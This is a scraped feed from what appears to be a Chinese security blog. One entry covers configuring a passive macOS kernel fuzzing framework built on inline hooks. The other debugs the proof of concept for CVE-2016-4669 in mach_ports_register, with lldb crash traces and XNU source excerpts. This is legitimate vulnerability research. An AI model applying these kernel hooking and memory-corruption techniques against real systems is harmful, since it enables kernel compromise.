com.apple.iokit.IOAudioFamily&#10;C334E229-C366-3862-8A15-2399723870C6 0xffffff7f8f28b220   0xffffff7f8f211000   0x7c000               77     1                1.2.0 com.apple.vecLib.kext&#10;90BC49A2-E1CC-4A22-FD55-BEF0A13A15DA 0xffffff7f8f6ccfa0   0xffffff7f8f6c8000   0xf000                76     1                1.1.0 com.parallels.driver.AppleIntelAC97Controller&#10;C1523713-8957-31FE-AA11-62E1787969B1 0xffffff7f8ee2bb98   0xffffff7f8ee17000   0x19000               75     3                3.1.9 com.apple.driver.AppleSMC&#10;5256D8E2-78AD-245C-06FB-3C14D329A8BF 0xffffff7f8e750600   0xffffff7f8e745000   0x1a000               74     0         12.1.0 41489 com.parallels.kext.video&#10;A360453D-2050-3C49-A549-AC0DD5E87917 0xffffff7f8e728b78   0xffffff7f8e6fe000   0x3b000               73     6                2.4.1 com.apple.iokit.IOGraphicsFamily&#10;E4D6A0C3-5C8D-3652-B673-3FAFAA027E2E 0xffffff7f8f3e1ac8   0xffffff7f8f3dd000   0x9000                72     0                  181 com.apple.driver.AppleHIDKeyboard&#10;AC74012B-CBBC-323B-B760-0E31B664B7B5 0xffffff7f8eab1cb0   0xffffff7f8eaaa000   0xa000                71     0                1.0.1 com.apple.driver.usb.IOUSBHostHIDDevice&#10;69D22F66-81DA-3CCF-8451-A7EBC991A601 0xffffff7f8ebe7dd0   0xffffff7f8ebc1000   0x2f000               70     0                1.0.1 com.apple.driver.usb.AppleUSBHub&#10;204EA973-076B-3517-93BF-9057AD3DDBD6 0xffffff7f8f31d420   0xffffff7f8f31a000   0x9000                69     0                5.0.0 com.apple.driver.usb.cdc&#10;70876950-E9CC-313C-A239-5C1E5CA936BF 0xffffff7f8f3147e8   0xffffff7f8f312000   0x8000                68     1                5.0.0 com.apple.driver.usb.networking&#10;DC814FD4-7773-3054-8D2C-AFA8E6CA034A 0xffffff7f8ebfc008   0xffffff7f8ebf8000   0x8000                67     1                1.0.1 com.apple.driver.usb.AppleUSBHostCompositeDevice&#10;AB75EB2D-F0DF-34C8-8CDC-C3BD98F6CFAD 0xffffff7f8ede5980   0xffffff7f8edd4000   0x1a000               66     0                3.7.7 com.apple.iokit.IOSCSIMultimediaCommandsDevice&#10;F5455A4B-6444-375B-B41A-9DD21ED76068 0xffffff7f8edcd350   0xffffff7f8edc8000   0x9000                65     1                  1.8 com.apple.iokit.IOBDStorageFamily&#10;D13AB661-E2CF-3761-8D59-61A1AC99637E 0xffffff7f8edc03c0   0xffffff7f8edba000   0xb000                64     2                  1.8 com.apple.iokit.IODVDStorageFamily&#10;293F10B5-7BF9-3C0C-976E-9E588489C303 0xffffff7f8edb1c30   0xffffff7f8eda9000   0xe000                63     3                  1.8 com.apple.iokit.IOCDStorageFamily&#10;12F3B8F2-0104-362F-9B60-7751D73D4D80 0xffffff7f8eda4748   0xffffff7f8ed9e000   0x7000                62     0                3.7.7 com.apple.iokit.SCSITaskUserClient&#10;945A757B-968E-34CE-9067-525B6D0F8550 0xffffff7f8f1c4a58   0xffffff7f8f1af000   0x16000               61     0             517.50.1 com.apple.driver.CoreStorageFsck&#10;3B950A54-941B-380E-9C93-31E70591696E 0xffffff7f8f186e90   0xffffff7f8f0ce000   0xdb000               60     1             517.50.1 com.apple.driver.CoreStorage&#10;642EEDB3-7CE7-354A-9030-C644EC3D9083 0xffffff7f8f2d2f10   0xffffff7f8f2ce000   0xa000                59     0                    3 com.apple.driver.AppleXsanScheme&#10;C8E6B461-D83A-3660-8A8B-43EA262D4C11 0xffffff7f8f09a390   0xffffff7f8f092000   0xd000                58     0                2.6.2 com.apple.iokit.IOAHCISerialATAPI&#10;07D953DC-7B94-3AE8-A379-2B02F5D538F9 0xffffff7f8e303eb0   0xffffff7f8e2e9000   0x2b000               57     3                3.7.7 com.apple.iokit.IOSCSIArchitectureModelFamily&#10;03357B30-E9B5-32DC-819D-CACA2B37AE19 0xffffff7f8f0ba0d0   0xffffff7f8f09f000   0x1c000               56     0                2.8.5 com.apple.iokit.IOAHCIBlockStorage&#10;D2861F03-33FC-3B1D-9572-00E11EB6B530 0xffffff7f8f7809a8   0xffffff7f8f77f000   0x2000                55     0                3.0.1 com.apple.driver.AppleFileSystemDriver&#10;8A48FC7E-CD9D-39E4-A243-59BBEB5D65BE 0xffffff7f8f778a40   0xffffff7f8f776000   0x3000                54     0              1.0.0d1 com.apple.AppleFSCompression.AppleFSCompressionTypeDataless&#10;8A37264E-9D9A-3B95-B0A1-EB1947CF70DA 0xffffff7f8f773460   0xffffff7f8f76e000   0x6000                53     0                1.0.0 com.apple.AppleFSCompression.AppleFSCompressionTypeZlib&#10;C1EA21DC-CEC4-34EF-8172-8D217927D3EC 0xffffff7f8f202a18   0xffffff7f8f1fa000   0xa000                52     0                   38 com.apple.BootCache&#10;C94AA870-B315-3B68-8942-94FD5095B016 0xffffff7f8ec0a548   0xffffff7f8ec00000   0xb000                51     0                1.0.1 com.apple.driver.usb.AppleUSBEHCIPCI&#10;D08C7EEE-CA01-3053-8D47-2587BBCF9C95 0xffffff7f8eb1c438   0xffffff7f8eb03000   0x20000               50     0                1.0.1 com.apple.driver.usb.AppleUSBXHCIPCI&#10;931A3E67-1954-320C-9619-C41C0A516804 0xffffff7f8eaf15e0   0xffffff7f8eabd000   0x40000               49     1                1.0.1 com.apple.driver.usb.AppleUSBXHCI&#10;5BF1DFC0-0647-3A29-8555-8C0341DFB8A3 0xffffff7f8eb93cb8   0xffffff7f8eb90000   0x4000                48     0                1.0.1 com.apple.driver.usb.AppleUSBUHCIPCI&#10;2F1227C1-A3A9-3709-B7A9-93506A65AB00 0xffffff7f8eb83e38   0xffffff7f8eb6e000   0x1f000               47     1                1.0.1 com.apple.driver.usb.AppleUSBUHCI&#10;0D241802-E006-3A72-B3C5-09ABDE37DAE0 0xffffff7f8eb5dfd8   0xffffff7f8eb2b000   0x3f000               46     3                1.0.1 com.apple.driver.usb.AppleUSBEHCI&#10;B9AFCAD5-5FFE-3E65-A186-CF4EA4571BCC 0xffffff7f8f7b8c98   0xffffff7f8f79a000   0x1f000               45     0                3.1.8 com.apple.driver.AppleAHCIPort&#10;58B77CC0-5211-342E-8935-8D05E0B96867 0xffffff7f8f087520   0xffffff7f8f074000   0x1b000               44     3                2.8.1 com.apple.iokit.IOAHCIFamily&#10;A6DFC31E-C32B-3FD9-8FC9-27791F49BBB5 0xffffff7f8f06b668   0xffffff7f8f062000   0xa000                43     0                2.5.1 com.apple.driver.AppleIntelPIIXATA&#10;148B6371-28AE-30E6-B469-00A9587C7EFF 0xffffff7f8f030668   0xffffff7f8f022000   0x19000               42     1                2.5.3 com.apple.iokit.IOATAFamily&#10;F74DD10C-690C-3B74-98F5-F50E093A1E68 0xffffff7f8ee90ce0   0xffffff7f8ee80000   0x11000               41     0              3.1.4b1 com.apple.driver.AppleIntel8254XEthernet&#10;848B398F-4D96-3024-8092-6CD3534D2CCA 0xffffff7f8e883f50   0xffffff7f8e868000   0x2d000               40     2                  3.2 com.apple.iokit.IONetworkingFamily&#10;FB980EB5-1F73-348E-9554-6F9F6FE481FD 0xffffff7f8e9c95d0   0xffffff7f8e953000   0x9a000               39     0              900.4.1 com.apple.iokit.IOUSBFamily&#10;79D250A3-843A-3750-BE64-A252CF17A148 0xffffff7f8e8fadb4   0xffffff7f8e8ac000   0x6a000               38    12                1.0.1 com.apple.iokit.IOUSBHostFamily&#10;401B7165-36E8-3EE5-849D-71DAEB3E46E4 0xffffff7f8e8a99a8   0xffffff7f8e8a8000   0x4000                37     2                1.0.1 com.apple.driver.AppleUSBHostMergeProperties&#10;0A3B2F6D-7FC8-34C1-B4B2-B4A53DC85DE5 0xffffff7f8f519ed0   0xffffff7f8f513000   0x8000                36     0              161.0.0 com.apple.driver.AppleSmartBatteryManager&#10;DFA558FE-59F9-32AA-8C3A-82BD65ECC094 0xffffff7f8ee550e0   0xffffff7f8ee4f000   0xa000                35     0                  2.0 com.apple.driver.AppleEFINVRAM&#10;CFC72657-568A-33B3-B84A-CF659674E655 0xffffff7f8ee4ca10   0xffffff7f8ee4a000   0x5000                34     1                  2.0 com.apple.driver.AppleEFIRuntime&#10;456C28F7-4F2B-3F00-97C9-BF6023DADD7C 0xffffff7f8f83bcb0   0xffffff7f8f838000   0x4000                33     0                  4.0 com.apple.driver.AppleACPIButtons&#10;9A3F90D7-1A6A-3FCD-9689-0BF6A66A29A2 0xffffff7f8ea75c58   0xffffff7f8ea1e000   0x78000               32     3                2.0.0 com.apple.iokit.IOHIDFamily&#10;801E20D9-1D7A-353F-A638-05430128D61D 0xffffff7f8f72c9c8   0xffffff7f8f72a000   0x3000                31     0                  1.8 com.apple.driver.AppleHPET&#10;87E6B264-9FE7-354F-A83B-2AF966681A50 0xffffff7f8f834540   0xffffff7f8f82e000   0x7000                30     0                  4.0 com.apple.driver.AppleACPIEC&#10;EA577FC5-B1EE-38B4-9B62-2938C01C2CB2 0xffffff7f8ed7fc58   0xffffff7f8ed7e000   0x4000                29     3                  1.1 com.apple.iokit.IOSMBusFamily&#10;6409E881-1F83-380E-8F03-F21DCFC4BF53 0xffffff7f8f5424f0   0xffffff7f8f53b000   0x8000                28     0                  2.0 com.apple.driver.AppleRTC&#10;BEB6C00A-8353-3DE6-A438-3D8AE2F9A5F0 0xffffff7f8f510ab8   0xffffff7f8f50d000   0x4000                27     0                  2.1 com.apple.driver.AppleSMBIOS&#10;04696395-E633-3657-89BD-9908A5C60F56 0xffffff7f8f797a28   0xffffff7f8f795000   0x3000                26     0                  1.7 com.apple.driver.AppleAPIC&#10;113F310F-1904-3F41-A206-1D275BF7A397 0xffffff7f8f846280   0xffffff7f8f83f000   0x8000                25     0                  163 com.apple.nke.applicationfirewall&#10;0ECF10A0-C16A-3013-B6B6-CD9F3DA76B01 0xffffff7f8e6efc00   0xffffff7f8e6e7000   0x9000                24     0                    3 com.apple.security.quarantine&#10;E32DE435-FAD0-3222-807A-32711BCB979B 0xffffff7f8e6e15c8   0xffffff7f8e6c9000   0x1e000               23     1                300.0 com.apple.security.sandbox&#10;F2211BA2-E656-3187-B06E-CF9D6A3A3B5A 0xffffff7f8e6c7008   0xffffff7f8e6c4000   0x5000                22     2              1.0.0d1 com.apple.kext.AppleMatch&#10;7F6B05B1-14AC-3634-B5CA-7F69452730B4 0xffffff7f8e5b1b08   0xffffff7f8e5b0000   0x2000                21     0                    8 com.apple.security.TMSafetyNet&#10;8CF8BDE4-6E36-3163-9EA1-DB09980ED7B2 0xffffff7f8f62e60c   0xffffff7f8f60c000   0x2b000               20     0                    2 com.apple.driver.AppleKeyStore&#10;D330951F-27FC-3A94-94A6-2AD7850E9C3C 0xffffff7f8e6ba808   0xffffff7f8e6b2000   0x12000               19     2                1.0.5 com.apple.driver.AppleMobileFileIntegrity&#10;22552717-92AB-3B19-98B5-5C067A104219 0xffffff7f8f606580   0xffffff7f8f5ee000   0x1e000               18     1                  1.0 com.apple.driver.AppleCredentialManager&#10;CDCF4D3F-89CC-3CDD-AB89-B6FFD304F26B 0xffffff7f8eeb9930   0xffffff7f8eea8000   0x19000               17     0                417.4 com.apple.driver.DiskImages&#10;DC1AAB7C-F417-3238-BB3F-2A5B84D67B90 0xffffff7f8e265550   0xffffff7f8e24c000   0x27000               16    12                  2.1 com.apple.iokit.IOStorageFamily&#10;C89107EE-2DF2-3BC3-9F6D-3133D43ED7EF 0xffffff7f8edf54d8   0xffffff7f8edf2000   0x7000                15     2                   31 com.apple.iokit.IOReportFamily&#10;C31A19C9-8174-3E35-B2CD-3B1B237C0220 0xffffff7f8ea1a4e0   0xffffff7f8ea13000   0xb000                14     1                28.30 com.apple.driver.AppleFDEKeyStore&#10;A29C7512-D3A8-3AED-9721-3A5FF1A32EB2 0xffffff7f8f8149f8   0xffffff7f8f7c8000   0x60000               13     2                  4.0 com.apple.driver.AppleACPIPlatform&#10;F51AA3D6-EC2F-3AD3-A043-06DB79027AA2 0xffffff7f8e351c48   0xffffff7f8e32c000   0x30000               12    22                  2.9 com.apple.iokit.IOPCIFamily&#10;5D7574C3-8E90-3873-BAEB-D979FC215A7D 0xffffff7f8eab7a00   0xffffff7f8eab4000   0x9000                11    21                  1.4 com.apple.iokit.IOACPIFamily&#10;9DDD9196-3824-3DCA-BAAA-7F383BC13C37 0xffffff7f8e784000   0xffffff7f8e77d000   0x9000                10     1                    1 com.apple.kec.Libm&#10;39D0B4EB-B7F4-3891-96C2-F8B886656C8A 0xffffff7f8e6fb6b8   0xffffff7f8e6f1000   0xd000                 9     0                    1 com.apple.kec.pthread&#10;ABDB0534-113E-3A88-8B89-52345E3AFDF7 0xffffff7f8e612ea0   0xffffff7f8e5b3000   0x95000                8     5                  1.0 com.apple.kec.corecrypto&#10;........-....-....-....-............ 0xffffff80142c1e00   0x0                  0x0                    7    60               15.6.0 com.apple.kpi.unsupported&#10;........-....-....-....-............ 0xffffff80142c1d00   0x0                  0x0                    6    45               15.6.0 com.apple.kpi.private&#10;........-....-....-....-............ 0xffffff80142c1100   0x0                  0x0                    5    88               15.6.0 com.apple.kpi.mach&#10;........-....-....-....-............ 0xffffff80142c1200   0x0                  0x0                    4   103               15.6.0 com.apple.kpi.libkern&#10;........-....-....-....-............ 0xffffff80142c1300   0x0                  0x0                    3    97               15.6.0 com.apple.kpi.iokit&#10;........-....-....-....-............ 0xffffff80142c1c00   0x0                  0x0                    2     8               15.6.0 com.apple.kpi.dsep&#10;........-....-....-....-............ 0xffffff80142c1b00   0x0                  0x0                    1    76               15.6.0 com.apple.kpi.bsd</span><br></pre></td></tr></table></figure>
<p>根据内核地址的比较</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5256D8E2-78AD-245C-06FB-3C14D329A8BF 0xffffff7f8e750600   0xffffff7f8e745000   0x1a000               74     0         12.1.0 41489 com.parallels.kext.video&#10;----&#10; frame #0: 0xffffff800d90e05b kernel.development`memcpy + 11&#10; frame #1: 0xffffff7f8e7485e8&#10; frame #2: 0xffffff7f8e746630</span><br></pre></td></tr></table></figure>
<p>可以看到崩溃在<code>com.parallels.kext.video</code>这个虚拟机的内核扩展中，所以安装了<code>KDK</code>也没有函数符号。这个模块不是我们感兴趣的，所以添加一个白名单，剔除掉对这个调用的fuzz。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"*"</span>,PROCESS_UID_ANY_INTEGER,<span class="string">"*"</span>,<span class="string">"IGAccelSharedUserClient"</span>,<span class="number">0</span>,<span class="comment">//tocheck-43</span></span><br><span class="line"><span class="comment">//By experience:</span></span><br><span class="line"><span class="comment">//"profil",PROCESS_UID_ANY_INTEGER,"*","*",ANY_MATCH_INTEGER,</span></span><br><span class="line"><span class="comment">//"notify",PROCESS_UID_ANY_INTEGER,"*","*",ANY_MATCH_INTEGER,</span></span><br><span class="line"><span class="comment">//"watchdog",PROCESS_UID_ANY_INTEGER,"*","*",ANY_MATCH_INTEGER,</span></span><br><span class="line"><span class="comment">//"vmware",PROCESS_UID_ANY_INTEGER,"*","*",ANY_MATCH_INTEGER,</span></span><br><span class="line"><span class="comment">//"*","PROCESS_UID_ANY_INTEGER,*","vmware",ANY_MATCH_INTEGER,</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//"*",PROCESS_UID_ANY_INTEGER,"*","AppleOSXWatchdogClient",ANY_MATCH_INTEGER,</span></span><br><span class="line"><span class="comment">//"*",PROCESS_UID_ANY_INTEGER,"*","AppleSMCClient",ANY_MATCH_INTEGER,</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Testing:</span></span><br><span class="line"><span class="comment">//"SystemUIServer",PROCESS_UID_ANY_INTEGER,"*","*",ANY_MATCH_INTEGER,</span></span><br><span class="line"><span class="string">"WindowServer"</span>,PROCESS_UID_ANY_INTEGER,<span class="string">"*"</span>,<span class="string">"*"</span>,ANY_MATCH_INTEGER, &lt;--windowserver 所有的相关的调用都不进行fuzz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//"dock",PROCESS_UID_ANY_INTEGER,"*","*",ANY_MATCH_INTEGER,</span></span><br></pre></td></tr></table></figure>
<p>这样一来，导致我们崩溃的这一条就不会进行<code>fuzz</code>从而剔除了这个干扰。编译之后再次加载</p>
<h1 id="3-4_再次加载内核扩展">3.4 再次加载内核扩展</h1><p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/pasive_fuzz/fuzzing.png" alt="fuzzing"></p>
<p>我把他们注释掉的调试信息都放开了，如果不把注释删了也看不到这些日志。</p>
<h1 id="0x04_小结">0x04 小结</h1><p>初步的使用这个<code>fuzzing</code>框架的过程就是这样，这个框架还会对其他几个核心函数进行测试，在<code>ppt</code>中也有所描述。同时这里也有相对应的测试开关。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bFuzzing flags</span></span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_CREATE_MAPPING_IN_TASK].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_IPC_KMSG_GET].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_COPY_IO].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_IS_IO_CONNECT_METHOD].bFuzzing = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_IPC_KMSG_SEND].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_MACH_MSG_OVERWRITE_TRAP].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_IS_IO_CONNECT_ASYNC_METHOD].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_KDP_PANIC_DUMP].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_IOKIT_USER_CLIENT_TRAP].bFuzzing = <span class="literal">false</span>;</span><br><span class="line">    g_inline_hook_entry[INLINE_ENUM_IS_IO_SERVICE_OPEN_EXTENDED].bFuzzing = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
<p>本次实验中只是修改了白名单，框架中还提供了黑名单，简单阅读源码之后也很容易理解它的功能，白名单和黑名单的实现，可以让fuzz更加的稳定。</p>
<h1 id="引用">引用</h1><p>[1]Revisiting Mac OS X Kernel Rootkits </p>
<p><a href="http://phrack.org/issues/69/7.html#article" target="_blank" rel="external">http://phrack.org/issues/69/7.html#article</a></p>
<p>[2]Resolving kernel symbols</p>
<p><a href="http://ho.ax/posts/2012/02/resolving-kernel-symbols/" target="_blank" rel="external">http://ho.ax/posts/2012/02/resolving-kernel-symbols/</a></p>
<p>[3]PassiveFuzzFrameworkOSX</p>
<p><a href="https://github.com/SilverMoonSecurity/PassiveFuzzFrameworkOSX" target="_blank" rel="external">https://github.com/SilverMoonSecurity/PassiveFuzzFrameworkOSX</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    前段时间<code>TREND</code>的研究员在<code>POC</code>安全大会上介绍了一款<code>OS X</code>系统上面的<code>Fuzz</code>框架，并且开源了。<code>github</code>点<a href="https://github.com/SilverMoonSecurity/PassiveFuzzFrameworkOSX">这里</a>。我记得看雪好像已经有翻译成中文版的PPT，找了一下没找到:-(。网上能找到的信息，这里就不复述了，有兴趣的读者可以自行阅读。</p>
<p>​    简单来说就是通过内核扩展，对一系列内核函数进行<code>inline hook</code>，在这些被<code>hook</code>的函数被调用的时候，对参数进行一些随机的修改。所以叫做被动式Fuzz，而不是传统的主动调用内核函数传入不同的参数。</p>]]>
    
    </summary>
    
      <category term="XNU" scheme="http://turingh.github.io/tags/XNU/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-4669分析与调试]]></title>
    <link href="http://turingh.github.io/2016/11/07/CVE-2016-4669%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/"/>
    <id>http://turingh.github.io/2016/11/07/CVE-2016-4669分析与调试/</id>
    <published>2016-11-07T19:57:00.000Z</published>
    <updated>2016-11-08T02:58:14.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>本文记录了对<a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-4669" target="_blank" rel="external">CVE-2016-4669</a>的<a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=244431" target="_blank" rel="external">POC</a>的调试中遇到的问题，以及相关知识的整理，该漏洞的原始报告在<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=882&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">这里</a>。原始报告中的内容，本文不在复述。</p>
<a id="more"></a>
<h1 id="0x01_基础知识">0x01 基础知识</h1><h2 id="1-1_MIG">1.1 MIG</h2><p><code>MIG</code>是<code>Mach</code>系统中使用的一种自动生成代码的脚本语言，以<code>.def</code>结尾。通过工具生成的代码分为<code>xxx.h</code>,<code>xxxClient.c</code>和<code>xxxServer.c</code>三个部分，在编译应用层程序时，和<code>xxxClient.c</code>文件一起编译，使用自动生成的代码。这里就是<code>poc</code>中的<code>taskUser.c</code>和<code>task.h</code>。</p>
<p>相关的细节可以查看《Mac OS X Internals: A Systems Approach》一书的<strong>Section 9.6</strong>中的描述。</p>
<h2 id="1-2_内核中的内存管理">1.2 内核中的内存管理</h2><p>描述内核中堆内存的管理相关内容可以参考这个slides，比较简单明了的说清楚了内核中内存的基本结构<a href="http://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf" target="_blank" rel="external">iOS 10 Kernel Heap Revisited</a>。</p>
<h1 id="0x02_调试过程">0x02 调试过程</h1><h2 id="2-1_core文件分析">2.1 core文件分析</h2><p>在运行<code>POC</code>之后系统崩溃，查看崩溃的调用栈。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) bt&#10;* thread #1: tid = 0x0000, 0xffffff80049c0f01 kernel`hw_lock_to + 17, stop reason = signal SIGSTOP&#10;  * frame #0: 0xffffff80049c0f01 kernel`hw_lock_to + 17&#10;    frame #1: 0xffffff80049c5cb3 kernel`usimple_lock(l=0xdeadbeefdeadbef7) + 35 at locks_i386.c:365 [opt]&#10;    frame #2: 0xffffff80048c991c kernel`ipc_port_release_send [inlined] lck_spin_lock(lck=0xdeadbeefdeadbef7) + 44 at locks_i386.c:269 [opt]&#10;    frame #3: 0xffffff80048c9914 kernel`ipc_port_release_send(port=0xdeadbeefdeadbeef) + 36 at ipc_port.c:1567 [opt]&#10;    frame #4: 0xffffff80048e22d3 kernel`mach_ports_register(task=&#60;unavailable&#62;, memory=0xffffff800aad4270, portsCnt=3) + 547 at ipc_tt.c:1097 [opt]&#10;    frame #5: 0xffffff8004935b3f kernel`_Xmach_ports_register(InHeadP=0xffffff800b2c297c, OutHeadP=0xffffff800e5c4b90) + 111 at task_server.c:647 [opt]&#10;    frame #6: 0xffffff80048df2c3 kernel`ipc_kobject_server(request=0xffffff800b2c2900) + 259 at ipc_kobject.c:340 [opt]&#10;    frame #7: 0xffffff80048c28f8 kernel`ipc_kmsg_send(kmsg=&#60;unavailable&#62;, option=&#60;unavailable&#62;, send_timeout=0) + 184 at ipc_kmsg.c:1443 [opt]&#10;    frame #8: 0xffffff80048d26a5 kernel`mach_msg_overwrite_trap(args=&#60;unavailable&#62;) + 197 at mach_msg.c:474 [opt]&#10;    frame #9: 0xffffff80049b8eca kernel`mach_call_munger64(state=0xffffff800f7e6540) + 410 at bsd_i386.c:560 [opt]&#10;    frame #10: 0xffffff80049ecd86 kernel`hndl_mach_scall64 + 22</span><br></pre></td></tr></table></figure>
<p>简单的分析一下调用栈</p>
<p><code>_Xmach_ports_register</code>就是<code>taskSever.c</code>中对应的函数。</p>
<p>出问题的最关键的是<code>#4</code>，<code>#5</code>两个栈。</p>
<p>通过分析<code>mach_ports_register</code>函数的源码</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">...</span><br><span class="line">     </span><br><span class="line">for (i = 0; i &lt; TASK_PORT_REGISTER_MAX; i++) &#123;</span><br><span class="line">	ipc_port_t old;</span><br><span class="line"></span><br><span class="line">	old = task-&gt;itk_registered[i];</span><br><span class="line">	task-&gt;itk_registered[i] = ports[i];</span><br><span class="line">	ports[i] = old;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">itk_unlock(task);</span><br><span class="line"></span><br><span class="line">for (i = 0; i &lt; TASK_PORT_REGISTER_MAX; i++)</span><br><span class="line">	if (IP_VALID(ports[i]))</span><br><span class="line">		ipc_port_release_send(ports[i]); &lt;--#5b崩溃的地方</span><br><span class="line"></span><br><span class="line">    if (portsCnt != 0)</span><br><span class="line">	kfree(memory,&lt;--释放memory</span><br><span class="line">	      (vm_size_t) (portsCnt * sizeof(mach_port_t)));</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>这里是对<code>ports</code>的数组中的参数调用<code>ipc_port_release_send</code>，出发的崩溃。</p>
<p>查看<code>ports</code>中的值，如下，</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(lldb) f 4</span><br><span class="line">kernel was compiled with optimization - stepping may behave oddly; variables may not be available.</span><br><span class="line">frame #4: 0xffffff80048e22d3 kernel`mach_ports_register(task=&lt;unavailable&gt;, memory=0xffffff800aad4270, portsCnt=3) + 547 at ipc_tt.c:1097 [opt]</span><br><span class="line">(lldb) p ports</span><br><span class="line">(ipc_port_t [3]) $0 = &#123;</span><br><span class="line">  [0] = 0xffffff800b890680</span><br><span class="line">  [1] = 0xdeadbeefdeadbeef</span><br><span class="line">  [2] = 0x6c7070612e6d6f63</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为源码中会使用<code>kfree</code>去释放<code>memory</code>,接下来就去动态的调试吧。</p>
<h1 id="2-2_动态调试">2.2 动态调试</h1><h3 id="2-2-1_mach_ports_register">2.2.1 mach_ports_register</h3><p>因为<code>mach_ports_register</code>这个函数在一些其他流程中都会有有调用，如果直接在内核中的<code>mach_ports_register</code>下断点，会有很多其他的调用会被断到，这里我的做法是先用<code>lldb</code>启动<code>r3gister</code>程序并断在<code>mach_ports_register</code>处，并运行。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#10140; lldb r3gister&#10;(lldb) target create &#34;r3gister&#34;&#10;Current executable set to &#39;r3gister&#39; (x86_64).&#10;(lldb) b mach_ports_register&#10;Breakpoint 1: 2 locations.&#10;(lldb) r&#10;Process 425 launched: &#39;/Users/mrh/mach_port_register/r3gister&#39; (x86_64)&#10;Process 425 stopped&#10;* thread #1: tid = 0x10fd, 0x00000001000012a7 r3gister`mach_ports_register(target_task=259, init_port_set=0x00007fff5fbffa98, init_port_setCnt=3) + 39 at taskUser.c:690, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 1.1&#10;    frame #0: 0x00000001000012a7 r3gister`mach_ports_register(target_task=259, init_port_set=0x00007fff5fbffa98, init_port_setCnt=3) + 39 at taskUser.c:690&#10;   687 &#9;&#9;&#9;Reply Out;&#10;   688 &#9;&#9;&#125; Mess;&#10;   689&#10;-&#62; 690 &#9;&#9;Request *InP = &#38;Mess.In;&#10;   691 &#9;&#9;Reply *Out0P = &#38;Mess.Out;&#10;   692&#10;   693 &#9;&#9;mach_msg_return_t msg_result;</span><br></pre></td></tr></table></figure>
<p>当已经断在这里的时候，在内核上下断点。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) b mach_ports_register &#10;Breakpoint 1: where = kernel.development`mach_ports_register + 40 at ipc_tt.c:1060, address = 0xffffff8009686568&#10;(lldb) c&#10;Process 1 resuming</span><br></pre></td></tr></table></figure>
<p>在内核的断点设置成功后，继续执行<code>r3gister</code>,就会触发内核中的断点。</p>
